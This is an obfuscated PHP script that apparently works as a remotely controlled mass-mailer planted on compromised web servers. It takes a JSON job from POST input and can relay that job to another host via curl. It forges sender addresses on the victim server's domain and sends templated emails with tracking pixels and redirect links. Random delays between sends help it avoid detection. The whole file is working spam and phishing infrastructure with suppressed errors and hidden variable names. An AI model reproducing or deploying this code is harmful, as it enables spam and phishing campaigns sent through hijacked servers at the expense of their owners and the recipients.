<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp4be2c8) { if ($sp4be2c8 == 'keys') { return array_keys($this->_keys); } } public function Import($sp4be2c8, $spfbb524) { if (is_array($spfbb524)) { $this->values[$sp4be2c8] = array(); foreach ($spfbb524 as $spe7280e) { if (!empty($spe7280e['key'])) { $this->values[$sp4be2c8][$spe7280e['key']] = $spe7280e['value']; } else { $this->values[$sp4be2c8][] = $spe7280e['value']; } } } else { $this->Assign($sp4be2c8, $spfbb524); } } public function Assign($sp4be2c8, $spe8c4be) { $this->values[$sp4be2c8] = $spe8c4be; } public function Parse($sp718a9c) { $sp2ee873 = ''; $sp2db9e6 = 0; while (true) { $spe842e9 = strpos($sp718a9c, '{', $sp2db9e6); if ($spe842e9 === false) { $sp2ee873 .= substr($sp718a9c, $sp2db9e6); break; } $sp2ee873 .= substr($sp718a9c, $sp2db9e6, $spe842e9 - $sp2db9e6); $sp2db9e6 = $spe842e9 + 1; $sp73cb14 = ''; $spf3b547 = '{'; $sp4c214f = array(); $sp499fd9 = false; $sp58e99c = false; $sp5e3093 = 'var'; while ($sp2db9e6 < strlen($sp718a9c)) { $spd16bc7 = substr($sp718a9c, $sp2db9e6, 1); $spf3b547 .= $spd16bc7; if ($spd16bc7 == ',' || $spd16bc7 == '>' || $spd16bc7 == '|') { if ($sp5e3093 == 'alias') { $sp499fd9 = $sp73cb14; } elseif ($sp5e3093 == 'mod') { $sp58e99c = $sp73cb14; } else { $sp4c214f[] = $sp73cb14; } $sp73cb14 = ''; if ($spd16bc7 == '>') { $sp5e3093 = 'alias'; } if ($spd16bc7 == '|') { $sp5e3093 = 'mod'; } $sp2db9e6++; continue; } if ($spd16bc7 == '}') { if ($sp5e3093 == 'alias') { $sp499fd9 = $sp73cb14; } elseif ($sp5e3093 == 'mod') { $sp58e99c = $sp73cb14; } else { $sp4c214f[] = $sp73cb14; } $sp2db9e6++; break; } $sp73cb14 .= $spd16bc7; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spd16bc7) == 0) { $sp2db9e6++; $sp4c214f = array(); break; } $sp2db9e6++; } if (sizeof($sp4c214f) == 0) { $sp2ee873 .= $spf3b547; continue; } $sp19a0cb = false; $sp0042a2 = false; if (preg_match('/^\\^/', $sp4c214f[0]) > 0) { $sp4c214f[0] = substr($sp4c214f[0], 1); $sp19a0cb = true; } if (preg_match('/^\\!/', $sp4c214f[0]) > 0) { $sp4c214f[0] = substr($sp4c214f[0], 1); $sp0042a2 = true; } $spbe1231 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp4c214f[0], $spc9378d) > 0) { $spbe1231 = $spc9378d[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp4c214f[0], $spc9378d) > 0) { $spbe1231 = explode('-', $spc9378d[1]); } if ($spbe1231 !== false) { $sp4c214f[0] = substr($sp4c214f[0], 0, strpos($sp4c214f[0], '[')); } $this->_keys[$sp4c214f[0]] = true; if (empty($this->values[$sp4c214f[0]]) && empty($this->fixed[$sp4c214f[0]])) { continue; } if ($sp19a0cb) { unset($this->fixed[$sp4c214f[0]]); } if (isset($this->fixed[$sp4c214f[0]])) { $spa1710c = $this->fixed[$sp4c214f[0]]; } else { $spa1710c = ''; $sp7567ca = 1; if (sizeof($sp4c214f) == 2) { $sp7567ca = $sp4c214f[1]; } if (sizeof($sp4c214f) == 3) { $sp7567ca = rand($sp4c214f[1], $sp4c214f[2]); } for ($speef73c = 0; $speef73c < $sp7567ca; $speef73c++) { if (is_array($this->values[$sp4c214f[0]])) { if (!is_array($this->used[$sp4c214f[0]])) { $this->used[$sp4c214f[0]] = array(); } if (count($this->used[$sp4c214f[0]]) == count($this->values[$sp4c214f[0]])) { $this->used[$sp4c214f[0]] = array(); } if ($spbe1231 !== false && is_scalar($spbe1231)) { $spa1710c .= $this->values[$sp4c214f[0]][$spbe1231]; $this->used[$spbe1231] = true; } else { $sp038e37 = array(); if (is_array($spbe1231)) { $sp52efc5 = $spbe1231[0]; $spfe66cf = $spbe1231[1]; } else { $sp52efc5 = 0; $spfe66cf = count($this->values[$sp4c214f[0]]) - 1; } for ($sp2bb9e6 = $sp52efc5; $sp2bb9e6 <= $spfe66cf; $sp2bb9e6++) { if ($sp0042a2 && !empty($this->used[$sp4c214f[0]][$sp2bb9e6])) { continue; } $sp038e37[] = $sp2bb9e6; } $sp22e087 = $sp038e37[rand(0, count($sp038e37) - 1)]; $this->used[$sp4c214f[0]][$sp22e087] = true; $spa1710c .= $this->values[$sp4c214f[0]][$sp22e087]; } } else { $spa1710c .= $this->values[$sp4c214f[0]]; } } } $spa1710c = $this->Parse($spa1710c); if ($sp58e99c !== false) { for ($sp13820e = 0; $sp13820e < strlen($sp58e99c); $sp13820e++) { switch (substr($sp58e99c, $sp13820e, 1)) { case 'b': $spa1710c = base64_encode($spa1710c); break; case 'q': $spa1710c = quoted_printable_encode($spa1710c); break; default: break; } } } if ($sp19a0cb) { $this->fixed[$sp4c214f[0]] = $spa1710c; } if ($sp499fd9 !== false && $sp499fd9 != '') { $this->fixed[$sp499fd9] = $spa1710c; } $sp2ee873 .= $spa1710c; } return $sp2ee873; } } $sp690804 = file_get_contents('php://input'); $sp8431a5 = json_decode($sp690804, true); if (empty($sp8431a5['via_proxy'])) { $sp8431a5['via_proxy'] = true; $sp213ec1 = curl_init($sp8431a5['prefix'] . $sp8431a5['files']['s']); $spae0330 = json_encode($sp8431a5); curl_setopt($sp213ec1, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp213ec1, CURLOPT_TIMEOUT, 600); curl_setopt($sp213ec1, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp213ec1, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp213ec1, CURLOPT_REFERER, $sp2e932b); curl_setopt($sp213ec1, CURLOPT_POST, true); curl_setopt($sp213ec1, CURLOPT_POSTFIELDS, $spae0330); curl_setopt($sp213ec1, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spae0330))); $sp8bc047 = curl_exec($sp213ec1); echo $sp8bc047; die; } $sp642cf5 = $_SERVER['SERVER_ADDR']; $sp933976 = $_SERVER['HTTP_HOST']; $sp933976 = preg_replace('/^www\\./', '', $sp933976); $sp1dee1e = new Macros(); $sp1dee1e->Assign('server_addr', $sp642cf5); $sp1dee1e->Assign('server_host', $sp933976); foreach ($sp8431a5['macros'] as $sp4be2c8 => $spfbb524) { $sp1dee1e->Import($sp4be2c8, $spfbb524); } $sp7c09a1 = preg_replace('/^www\\./i', '', $sp933976); $sp1e47fb = $sp1dee1e->Parse('{from_user}@' . $sp7c09a1); $sp1dee1e->Assign('from_email', $sp1e47fb); $sp1dee1e->Assign('prefix', $sp8431a5['prefix']); $sp1dee1e->Assign('html', $sp8431a5['letter']['html']); $sp2db9e6 = 0; $sp716474 = 0; $sp25c335 = 0; $sp356391 = array(); foreach ($sp8431a5['rcpt'] as $sp7941e0) { $sp1dee1e->Assign('email', $sp7941e0['email']); $sp1dee1e->Assign('entry', $sp7941e0); $sp1dee1e->Assign('date', date('r')); $sp1dee1e->Assign('redirect', $sp8431a5['prefix'] . $sp8431a5['files']['r']); $sp1dee1e->Assign('redirect_with_uri', $sp8431a5['prefix'] . $sp8431a5['files']['r'] . '?uri='); $sp1dee1e->Assign('unsubscribe', $sp8431a5['prefix'] . $sp8431a5['files']['u'] . '?id=' . $sp7941e0['id']); $sp1dee1e->Assign('delivery', '<img src="' . $sp8431a5['prefix'] . $sp8431a5['files']['d'] . '?id=' . $sp7941e0['id'] . '" />'); $spac5d6e = $sp1dee1e->Parse($sp8431a5['envelope']['header']); $spc5192b = $sp1dee1e->Parse($sp8431a5['envelope']['body']); if (!empty($sp7941e0['name'])) { $sp14162e = $sp7941e0['name'] . ' <' . $sp7941e0['email'] . '>'; } else { $sp14162e = $sp7941e0['email']; } $sp95d17e = $sp1dee1e->Parse($sp8431a5['letter']['subject']); if ($sp2db9e6 > 0) { sleep(rand(3, 8)); } $sp2d4845 = mail($sp14162e, $sp95d17e, $spc5192b, $spac5d6e); $sp356391[$sp7941e0['id']] = $sp2d4845; if ($sp2d4845) { $sp716474++; } else { $sp25c335++; } $sp2db9e6++; } echo serialize(array('total' => count($sp8431a5['rcpt']), 'sent' => $sp2db9e6, 'success' => $sp716474, 'error' => $sp25c335, 'rcpt' => $sp356391));